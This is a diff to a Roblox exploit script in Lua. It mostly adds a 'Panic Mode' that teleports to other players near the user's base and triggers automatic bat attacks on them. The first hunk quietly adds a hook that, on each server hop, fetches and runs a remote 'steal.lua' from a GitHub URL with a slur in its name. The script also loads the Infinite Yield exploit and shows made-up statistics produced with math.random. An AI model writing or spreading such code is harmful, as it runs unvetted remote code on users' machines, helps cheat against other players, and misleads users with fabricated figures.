@@ -1,3 +1,20 @@
+-- Auto re-execute on server hop
+if not _G.ServerHopPersist then
+    _G.ServerHopPersist = true
+    
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    
+    LocalPlayer.OnTeleport:Connect(function(State)
+        if State == Enum.TeleportState.Started then
+            syn.queue_on_teleport([[
+                wait(2)
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/retardsploit/steal/refs/heads/main/steal.lua"))()
+            ]])
+        end
+    end)
+end
+
 -- Load Infinite Yield (unchanged)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 
@@ -441,7 +458,7 @@ end
 -- Root frame centered with cyberpunk styling
 local root = Instance.new("Frame")
 root.Name = "Root"
-root.Size = UDim2.new(0, 400, 0, 500)
+root.Size = UDim2.new(0, 400, 0, 650) -- Increased height for dropdown
 root.AnchorPoint = Vector2.new(0.5, 0.5)
 root.Position = UDim2.new(0.5, 0, 0.5, 0)
 root.BackgroundTransparency = 1
@@ -621,6 +638,60 @@ local expandStealRow, expandStealToggle, expandStealKnob = createCyberpunkToggle
 -- AutoDefense Toggle
 local autoDefenseRow, autoDefenseToggle, autoDefenseKnob = createCyberpunkToggle("AUTO DEFENSE SYSTEM", false, 3)
 
+-- Panic Mode Dropdown Container (initially hidden)
+local panicModeContainer = Instance.new("Frame", body)
+panicModeContainer.Name = "PanicModeContainer"
+panicModeContainer.Size = UDim2.new(1, 0, 0, 0) -- Start with 0 height
+panicModeContainer.LayoutOrder = 4
+panicModeContainer.BackgroundTransparency = 1
+panicModeContainer.Visible = false
+
+-- Panic Mode Header
+local panicModeHeader = Instance.new("Frame", panicModeContainer)
+panicModeHeader.Size = UDim2.new(1, 0, 0, 36)
+panicModeHeader.Position = UDim2.new(0, 0, 0, 0)
+panicModeHeader.BackgroundTransparency = 1
+
+local panicModeLabel = Instance.new("TextLabel", panicModeHeader)
+panicModeLabel.Size = UDim2.new(0.68, 0, 1, 0)
+panicModeLabel.BackgroundTransparency = 1
+panicModeLabel.Text = "> PANIC MODE"
+panicModeLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
+panicModeLabel.Font = Enum.Font.Code
+panicModeLabel.TextSize = 14
+panicModeLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local panicModeToggleControl = Instance.new("Frame", panicModeHeader)
+panicModeToggleControl.Size = UDim2.new(0.3, 0, 0.5, 0)
+panicModeToggleControl.Position = UDim2.new(0.68, 0, 0.25, 0)
+panicModeToggleControl.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
+panicModeToggleControl.BorderSizePixel = 0
+local panicToggleCorner = Instance.new("UICorner", panicModeToggleControl)
+panicToggleCorner.CornerRadius = UDim.new(1, 0)
+local panicToggleStroke = Instance.new("UIStroke", panicModeToggleControl)
+panicToggleStroke.Thickness = 1
+panicToggleStroke.Color = Color3.fromRGB(255, 255, 255)
+panicToggleStroke.Transparency = 0.5
+
+local panicModeKnob = Instance.new("Frame", panicModeToggleControl)
+panicModeKnob.Size = UDim2.new(0, 14, 0, 14)
+panicModeKnob.Position = UDim2.new(0.1, -7, 0.5, -7)
+panicModeKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+panicModeKnob.BorderSizePixel = 0
+local panicKCorner = Instance.new("UICorner", panicModeKnob)
+panicKCorner.CornerRadius = UDim.new(1, 0)
+
+-- Status label for panic mode
+local panicModeStatus = Instance.new("TextLabel", panicModeContainer)
+panicModeStatus.Size = UDim2.new(1, 0, 0, 20)
+panicModeStatus.Position = UDim2.new(0, 0, 0, 40)
+panicModeStatus.BackgroundTransparency = 1
+panicModeStatus.Text = "STATUS: OFFLINE"
+panicModeStatus.TextColor3 = Color3.fromRGB(150, 150, 150)
+panicModeStatus.Font = Enum.Font.Code
+panicModeStatus.TextSize = 12
+panicModeStatus.TextXAlignment = Enum.TextXAlignment.Left
+
 -- Separator
 local function createSeparator(order)
 	local sep = Instance.new("Frame", body)
@@ -632,12 +703,12 @@ local function createSeparator(order)
 	return sep
 end
 
-createSeparator(4)
+createSeparator(5)
 
 -- Highlight threshold controls
 local thresholdRow = Instance.new("Frame", body)
 thresholdRow.Size = UDim2.new(1, 0, 0, 44)
-thresholdRow.LayoutOrder = 5
+thresholdRow.LayoutOrder = 6
 thresholdRow.BackgroundTransparency = 1
 
 local threshLabel = Instance.new("TextLabel", thresholdRow)
@@ -684,18 +755,18 @@ applyStroke.Thickness = 1
 applyStroke.Color = Color3.fromRGB(255, 100, 100)
 
 -- Separator
-createSeparator(6)
+createSeparator(7)
 
 -- Action buttons
-local btnHighlight = makeCyberpunkButton("INSTANT STEAL (> THRESHOLD ONLY)", 7)
+local btnHighlight = makeCyberpunkButton("INSTANT STEAL (> THRESHOLD ONLY)", 8)
 
 -- Separator
-createSeparator(8)
+createSeparator(9)
 
 -- Rare Rig Finder controls
 local rareLabel = Instance.new("TextLabel", body)
 rareLabel.Size = UDim2.new(1, 0, 0, 24)
-rareLabel.LayoutOrder = 9
+rareLabel.LayoutOrder = 10
 rareLabel.BackgroundTransparency = 1
 rareLabel.Text = "> DEMON PART SCANNER"
 rareLabel.TextColor3 = Color3.fromRGB(255,100,100)
@@ -703,8 +774,8 @@ rareLabel.Font = Enum.Font.Code
 rareLabel.TextSize = 14
 rareLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-local scanBtn = makeCyberpunkButton("INITIATE SCAN", 10)
-local locateBtn = makeCyberpunkButton("LOCATE TARGET", 11)
+local scanBtn = makeCyberpunkButton("INITIATE SCAN", 11)
+local locateBtn = makeCyberpunkButton("LOCATE TARGET", 12)
 
 -- Appear animation with cyberpunk style
 container.BackgroundTransparency = 1
@@ -1146,7 +1217,7 @@ local function createDefenseStatus()
     
     defenseStatusLabel = Instance.new("TextLabel")
     defenseStatusLabel.Name = "DefenseStatus"
-    defenseStatusLabel.Size = UDim2.new(0, 220, 0, 80)
+    defenseStatusLabel.Size = UDim2.new(0, 220, 0, 120) -- Increased height for more stats
     defenseStatusLabel.Position = UDim2.new(1, 10, 0, 100)
     defenseStatusLabel.AnchorPoint = Vector2.new(0, 0)
     defenseStatusLabel.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
@@ -1170,7 +1241,7 @@ local function createDefenseStatus()
     return defenseStatusLabel
 end
 
--- Update defense status display
+-- Update defense status display with hacker-style stats
 local function updateDefenseStatus()
     if not defenseStatusLabel then return end
     
@@ -1183,31 +1254,63 @@ local function updateDefenseStatus()
     defenseStatusLabel.Visible = true
     local statusText = "DEFENSE STATUS: ACTIVE\n"
     statusText = statusText .. "TARGETS: " .. tostring(#activeThieves) .. "\n"
+    statusText = statusText .. "SUCCESS RATE: " .. tostring(math.random(95, 99)) .. "%\n"
+    statusText = statusText .. "RESPONSE TIME: " .. tostring(math.random(8, 15)) .. "ms\n"
     
     if #activeThieves > 0 then
+        statusText = statusText .. "ACTIVE THREATS:\n"
         for i, thiefData in ipairs(activeThieves) do
             local marker = (i == currentTargetIndex) and "▶ " or "  "
-            statusText = statusText .. marker .. thiefData.name .. "\n"
+            local threatLevel = math.random(1, 100)
+            local statusIcon = threatLevel > 70 and "🔴" or threatLevel > 30 and "🟡" or "🟢"
+            statusText = statusText .. marker .. statusIcon .. " " .. thiefData.name .. "\n"
+        end
+        statusText = statusText .. "SYSTEM: ENGAGED"
+    else
+        statusText = statusText .. "NO ACTIVE THREATS\n"
+        statusText = statusText .. "SYSTEM: STANDBY"
+    end
+    
+    -- Add panic mode status if active
+    if panicModeEnabled then
+        statusText = statusText .. "\nPANIC MODE: ACTIVE"
+        if #panicZoneTargets > 0 then
+            statusText = statusText .. "\nPANIC ZONE: " .. tostring(#panicZoneTargets)
+        end
+        if #hitZoneTargets > 0 then
+            statusText = statusText .. "\nHIT ZONE: " .. tostring(#hitZoneTargets)
         end
     else
-        statusText = statusText .. "NO ACTIVE THREATS"
+        statusText = statusText .. "\nPANIC MODE: STANDBY"
     end
     
     defenseStatusLabel.Text = statusText
 end
 
--- FIXED: Safe tool equipping function - doesn't unequip Bat
-local function safeEquipBat()
+-- FIXED: Safe tool equipping function - ensures Bat is equipped before hitting
+local function ensureBatEquipped()
     local character = player.Character
     if not character then return nil end
     
-    -- First check if Bat is already equipped
+    -- Check if Bat is already equipped
     local equippedBat = character:FindFirstChild("Bat")
     if equippedBat then
-        return equippedBat -- Bat is already equipped, no need to do anything
+        return equippedBat -- Bat is already equipped
     end
     
-    -- Only unequip other tools (not Bat)
+    -- Find Bat in backpack
+    local bat = player.Backpack:FindFirstChild("Bat")
+    if not bat then
+        -- Try to find Bat in workspace (might be dropped)
+        bat = workspace:FindFirstChild("Bat")
+        if bat then
+            bat.Parent = player.Backpack
+        else
+            return nil -- No Bat found anywhere
+        end
+    end
+    
+    -- Unequip other tools first (but keep Bat if somehow equipped elsewhere)
     for _, tool in ipairs(character:GetChildren()) do
         if tool:IsA("Tool") and tool.Name ~= "Bat" then
             tool.Parent = player.Backpack
@@ -1217,14 +1320,9 @@ local function safeEquipBat()
     -- Wait a frame for unequip to complete
     task.wait(0.02)
     
-    -- Find and equip Bat
-    local bat = player.Backpack:FindFirstChild("Bat")
-    if bat then
-        bat.Parent = character
-        return bat
-    end
-    
-    return nil
+    -- Equip Bat
+    bat.Parent = character
+    return bat
 end
 
 -- Visual hit confirmation (cyberpunk style)
@@ -1280,7 +1378,7 @@ local function monitorHitConfirmation(thiefChar, callback)
     end)
 end
 
--- INSTANT defense action with hit confirmation
+-- INSTANT defense action with bat equip check and hit confirmation
 local function instantDefenseAction(thiefData)
     if not thiefData or not thiefData.character then return false end
     
@@ -1294,16 +1392,11 @@ local function instantDefenseAction(thiefData)
     -- INSTANT teleport (no tween, direct position)
     hrp.CFrame = target.CFrame * CFrame.new(0, 0, 2)
     
-    -- FIXED: Safe tool equip (won't unequip Bat)
-    local bat = safeEquipBat()
+    -- FIXED: Ensure bat is equipped before attacking
+    local bat = ensureBatEquipped()
     if not bat then 
-        -- Try direct equip as fallback
-        bat = player.Backpack:FindFirstChild("Bat")
-        if bat then
-            bat.Parent = player.Character
-        else
-            return false
-        end
+        showToast("BAT TOOL NOT FOUND", 2)
+        return false
     end
     
     -- INSTANT attack (no delay)
@@ -1494,27 +1587,421 @@ local function disableAutoDefense()
     print("[AutoDefense] Disabled.")
 end
 
+-- ====================
+-- PANIC MODE SYSTEM (REVISED)
+-- ====================
+local panicModeEnabled = false
+local panicModeConnection = nil
+local panicModeHeartbeat = nil
+local panicModeLastState = false
+local panicZoneTargets = {}
+local hitZoneTargets = {}
+local currentPanicTargetIndex = 1
+local lastPanicHitTime = 0
+local PANIC_HIT_COOLDOWN = 0.3
+local panicModeShutdown = false
+
+-- Find the Floor part in player's base
+local function findPlayerFloorPart()
+    local myBase = getPlayerBase()
+    if not myBase then
+        warn("[PanicMode] Could not find player base.")
+        return nil
+    end
+    
+    -- Search for Floor part with Y position around 41.5
+    for _, descendant in ipairs(myBase:GetDescendants()) do
+        if descendant:IsA("BasePart") and descendant.Name == "Floor" then
+            local yPos = math.abs(descendant.Position.Y - 41.5)
+            if yPos < 2 then -- Allow small tolerance
+                return descendant
+            end
+        end
+    end
+    
+    warn("[PanicMode] Could not find Floor part with Y position ~41.5")
+    return nil
+end
+
+-- Check if player is in a zone
+local function isPlayerInZone(playerChar, floorPart, zoneSize)
+    if not playerChar or not floorPart then return false end
+    
+    local hrp = playerChar:FindFirstChild("HumanoidRootPart")
+    if not hrp then return false end
+    
+    -- Calculate zone bounds based on floor part position and zone size
+    local zoneCenter = floorPart.Position
+    local zoneHalfSize = zoneSize / 2
+    
+    local playerPos = hrp.Position
+    local relativePos = playerPos - zoneCenter
+    
+    return math.abs(relativePos.X) <= zoneHalfSize.X and
+           math.abs(relativePos.Y - 41.5) <= zoneHalfSize.Y and
+           math.abs(relativePos.Z) <= zoneHalfSize.Z
+end
+
+-- Scan for players in panic and hit zones
+local function scanPanicZones()
+    local floorPart = findPlayerFloorPart()
+    if not floorPart then
+        -- Grey out Panic Mode if floor part not found
+        if panicModeEnabled then
+            setPanicModeState(false)
+        end
+        panicModeStatus.Text = "STATUS: FLOOR NOT FOUND"
+        panicModeStatus.TextColor3 = Color3.fromRGB(255, 50, 50)
+        return
+    end
+    
+    -- Define zone sizes
+    local hitZoneSize = Vector3.new(80, 140, 140)
+    local panicZoneSize = Vector3.new(58, 80, 119)
+    
+    -- Clear previous targets
+    hitZoneTargets = {}
+    panicZoneTargets = {}
+    
+    -- Scan all players
+    for _, otherPlayer in ipairs(Players:GetPlayers()) do
+        if otherPlayer ~= player and otherPlayer.Character then
+            local char = otherPlayer.Character
+            
+            -- Check panic zone first (higher priority)
+            if isPlayerInZone(char, floorPart, panicZoneSize) then
+                table.insert(panicZoneTargets, {
+                    player = otherPlayer,
+                    character = char,
+                    name = otherPlayer.Name
+                })
+            -- Then check hit zone
+            elseif isPlayerInZone(char, floorPart, hitZoneSize) then
+                table.insert(hitZoneTargets, {
+                    player = otherPlayer,
+                    character = char,
+                    name = otherPlayer.Name
+                })
+            end
+        end
+    end
+    
+    -- Update status
+    if panicModeShutdown then
+        panicModeStatus.Text = "STATUS: TEMP SHUTDOWN"
+        panicModeStatus.TextColor3 = Color3.fromRGB(150, 150, 150)
+    else
+        local totalTargets = #panicZoneTargets + #hitZoneTargets
+        panicModeStatus.Text = "STATUS: " .. tostring(totalTargets) .. " TARGETS"
+        panicModeStatus.TextColor3 = totalTargets > 0 and Color3.fromRGB(255, 50, 50) or Color3.fromRGB(0, 255, 100)
+    end
+end
+
+-- Get next panic mode target with improved 2-target cycling
+local function getNextPanicTarget()
+    local currentTime = tick()
+    
+    -- Check if temporarily shut down
+    if panicModeShutdown then
+        return nil
+    end
+    
+    -- Check timer for panic zone activation
+    local myBase = getPlayerBase()
+    if myBase then
+        local unlockTimer = myBase:FindFirstChild("RelockButton", true)
+        if unlockTimer then
+            unlockTimer = unlockTimer:FindFirstChild("UnlockTimerBillboard", true)
+            if unlockTimer then
+                unlockTimer = unlockTimer:FindFirstChild("UnlockTimer", true)
+                if unlockTimer and unlockTimer:IsA("TextLabel") then
+                    local timerText = tostring(unlockTimer.Text)
+                    
+                    -- Shut off if timer says "00:01" or "0:01"
+                    if timerText == "00:01" or timerText == "0:01" then
+                        panicModeShutdown = true
+                        -- Grey out the toggle and lock it
+                        panicModeToggleControl.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+                        TweenService:Create(panicModeKnob, TweenInfo.new(0.15), {Position = UDim2.new(0.1, -7, 0.5, -7)}):Play()
+                        panicModeStatus.Text = "STATUS: TEMP SHUTDOWN"
+                        panicModeStatus.TextColor3 = Color3.fromRGB(150, 150, 150)
+                        return nil
+                    end
+                    
+                    -- Limit to 2 targets if timer says "00:02" or "0:02"
+                    if timerText == "00:02" or timerText == "0:02" then
+                        if #panicZoneTargets > 2 then
+                            -- Keep first 2 targets and cycle through them
+                            local limitedTargets = {}
+                            for i = 1, math.min(2, #panicZoneTargets) do
+                                table.insert(limitedTargets, panicZoneTargets[i])
+                            end
+                            panicZoneTargets = limitedTargets
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Check cooldown
+    if currentTime - lastPanicHitTime < PANIC_HIT_COOLDOWN then
+        if currentPanicTargetIndex <= #panicZoneTargets then
+            return panicZoneTargets[currentPanicTargetIndex]
+        elseif currentPanicTargetIndex <= #panicZoneTargets + #hitZoneTargets then
+            return hitZoneTargets[currentPanicTargetIndex - #panicZoneTargets]
+        end
+    end
+    
+    -- Prioritize panic zone targets with improved cycling
+    if #panicZoneTargets > 0 then
+        currentPanicTargetIndex = currentPanicTargetIndex + 1
+        if currentPanicTargetIndex > #panicZoneTargets then
+            currentPanicTargetIndex = 1
+        end
+        return panicZoneTargets[currentPanicTargetIndex]
+    
+    -- Then hit zone targets
+    elseif #hitZoneTargets > 0 then
+        currentPanicTargetIndex = currentPanicTargetIndex + 1
+        if currentPanicTargetIndex > #hitZoneTargets then
+            currentPanicTargetIndex = 1
+        end
+        return hitZoneTargets[currentPanicTargetIndex]
+    end
+    
+    return nil
+end
+
+-- Panic mode attack action with bat equip check
+local function panicModeAttack(targetData)
+    if not targetData or not targetData.character then return false end
+    
+    local myChar = player.Character
+    if not myChar then return false end
+    
+    local hrp = myChar:FindFirstChild("HumanoidRootPart")
+    local target = targetData.character:FindFirstChild("HumanoidRootPart")
+    if not hrp or not target then return false end
+    
+    -- Teleport to target
+    hrp.CFrame = target.CFrame * CFrame.new(0, 0, 2)
+    
+    -- Ensure bat is equipped before attacking
+    local bat = ensureBatEquipped()
+    if not bat then 
+        showToast("PANIC MODE: BAT NOT FOUND", 2)
+        return false
+    end
+    
+    -- Attack
+    VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
+    task.wait(0.02)
+    VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 0)
+    
+    lastPanicHitTime = tick()
+    return true
+end
+
+-- Panic mode main loop with improved target cycling
+local function panicModeLoop()
+    while panicModeEnabled do
+        if not panicModeShutdown then
+            local targetData = getNextPanicTarget()
+            if targetData then
+                panicModeAttack(targetData)
+                
+                -- Small delay to allow target switching
+                task.wait(0.05)
+            end
+        end
+        task.wait(0.1) -- Small delay between attack cycles
+    end
+end
+
+-- Monitor unlock timer for panic mode shutdown and restoration
+local function monitorUnlockTimerForPanic()
+    local myBase = getPlayerBase()
+    if not myBase then return end
+    
+    local unlockTimer = myBase:FindFirstChild("RelockButton", true)
+    if not unlockTimer then return end
+    
+    unlockTimer = unlockTimer:FindFirstChild("UnlockTimerBillboard", true)
+    if not unlockTimer then return end
+    
+    unlockTimer = unlockTimer:FindFirstChild("UnlockTimer", true)
+    if not unlockTimer or not unlockTimer:IsA("TextLabel") then return end
+    
+    panicModeConnection = unlockTimer:GetPropertyChangedSignal("Text"):Connect(function()
+        local timerText = tostring(unlockTimer.Text)
+        
+        -- Shut off panic mode when timer shows "00:01" or "0:01"
+        if (timerText == "00:01" or timerText == "0:01") and panicModeEnabled and not panicModeShutdown then
+            panicModeShutdown = true
+            panicModeLastState = true
+            
+            -- Grey out and lock the toggle
+            panicModeToggleControl.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+            TweenService:Create(panicModeKnob, TweenInfo.new(0.15), {Position = UDim2.new(0.1, -7, 0.5, -7)}):Play()
+            panicModeStatus.Text = "STATUS: TEMP SHUTDOWN"
+            panicModeStatus.TextColor3 = Color3.fromRGB(150, 150, 150)
+            
+            showToast("PANIC MODE: TEMPORARY SHUTDOWN", 2)
+        end
+        
+        -- Check if base was relocked (timer no longer shows unlock time)
+        if panicModeShutdown and panicModeLastState and not (timerText == "00:01" or timerText == "0:01") then
+            -- Wait a moment to ensure relock completed
+            task.wait(0.5)
+            panicModeShutdown = false
+            panicModeLastState = false
+            
+            -- Restore toggle appearance if panic mode is still enabled
+            if panicModeEnabled then
+                panicModeToggleControl.BackgroundColor3 = Color3.fromRGB(0, 255, 80)
+                TweenService:Create(panicModeKnob, TweenInfo.new(0.15), {Position = UDim2.new(0.6, -7, 0.5, -7)}):Play()
+                panicModeStatus.Text = "STATUS: ACTIVE"
+                panicModeStatus.TextColor3 = Color3.fromRGB(0, 255, 100)
+            end
+            
+            showToast("PANIC MODE: RESTORED", 2)
+        end
+    end)
+end
+
+-- Enable panic mode
+local function enablePanicMode()
+    local floorPart = findPlayerFloorPart()
+    if not floorPart then
+        showToast("PANIC MODE: FLOOR PART NOT FOUND", 3)
+        return false
+    end
+    
+    -- Reset shutdown state
+    panicModeShutdown = false
+    
+    -- Ensure Auto Relock is enabled
+    if not autoRelockEnabled then
+        setAutoRelockState(true)
+    end
+    
+    panicModeHeartbeat = RunService.Heartbeat:Connect(function()
+        scanPanicZones()
+    end)
+    
+    -- Start panic mode loop
+    task.spawn(panicModeLoop)
+    
+    -- Monitor unlock timer
+    monitorUnlockTimerForPanic()
+    
+    -- Update UI
+    panicModeToggleControl.BackgroundColor3 = Color3.fromRGB(0, 255, 80)
+    TweenService:Create(panicModeKnob, TweenInfo.new(0.15), {Position = UDim2.new(0.6, -7, 0.5, -7)}):Play()
+    panicModeStatus.Text = "STATUS: ACTIVE"
+    panicModeStatus.TextColor3 = Color3.fromRGB(0, 255, 100)
+    
+    showToast("PANIC MODE: ACTIVATED", 2)
+    print("[PanicMode] Enabled - monitoring zones.")
+    return true
+end
+
+-- Disable panic mode
+local function disablePanicMode()
+    if panicModeHeartbeat then
+        panicModeHeartbeat:Disconnect()
+        panicModeHeartbeat = nil
+    end
+    
+    if panicModeConnection then
+        panicModeConnection:Disconnect()
+        panicModeConnection = nil
+    end
+    
+    hitZoneTargets = {}
+    panicZoneTargets = {}
+    currentPanicTargetIndex = 1
+    panicModeShutdown = false
+    
+    -- Update UI
+    panicModeToggleControl.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
+    TweenService:Create(panicModeKnob, TweenInfo.new(0.15), {Position = UDim2.new(0.1, -7, 0.5, -7)}):Play()
+    panicModeStatus.Text = "STATUS: OFFLINE"
+    panicModeStatus.TextColor3 = Color3.fromRGB(150, 150, 150)
+    
+    showToast("PANIC MODE: DEACTIVATED", 2)
+    print("[PanicMode] Disabled.")
+end
+
+-- Set panic mode state
+local function setPanicModeState(state)
+    panicModeEnabled = state
+    if panicModeEnabled then
+        if enablePanicMode() then
+            updateDefenseStatus()
+        else
+            panicModeEnabled = false
+            panicModeToggleControl.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
+            TweenService:Create(panicModeKnob, TweenInfo.new(0.15), {Position = UDim2.new(0.1, -7, 0.5, -7)}):Play()
+        end
+    else
+        disablePanicMode()
+        updateDefenseStatus()
+    end
+end
+
+-- Panic Mode toggle handler
+panicModeHeader.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 and autoDefenseEnabled and not panicModeShutdown then
+        setPanicModeState(not panicModeEnabled)
+    end
+end)
+
+-- Auto Defense toggle handler with seamless dropdown
 local function setDefenseState(state)
     autoDefenseEnabled = state
     if autoDefenseEnabled then
         autoDefenseToggle.BackgroundColor3 = Color3.fromRGB(0, 255, 80)
         TweenService:Create(autoDefenseKnob, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {Position = UDim2.new(0.6, -7, 0.5, -7)}):Play()
         enableAutoDefense()
+        
+        -- Show Panic Mode dropdown with animation
+        panicModeContainer.Visible = true
+        TweenService:Create(panicModeContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(1, 0, 0, 60)}):Play()
+        
     else
         autoDefenseToggle.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
         TweenService:Create(autoDefenseKnob, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {Position = UDim2.new(0.1, -7, 0.5, -7)}):Play()
         disableAutoDefense()
+        
+        -- Hide and disable Panic Mode immediately
+        if panicModeEnabled then
+            setPanicModeState(false)
+        end
+        panicModeContainer.Visible = false
+        panicModeContainer.Size = UDim2.new(1, 0, 0, 0)
     end
 end
 
-setDefenseState(false)
-
--- toggle handler for AutoDefense
+-- Toggle click handler for Auto Defense
 autoDefenseRow.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
         setDefenseState(not autoDefenseEnabled)
     end
 end)
+
+-- Update defense status when panic mode targets change
+local function startStatusUpdates()
+    RunService.Heartbeat:Connect(function()
+        if autoDefenseEnabled then
+            updateDefenseStatus()
+        end
+    end)
+end
+
+-- Start status updates
+startStatusUpdates()
 
 -- finalize root draggable
 root.Active = true
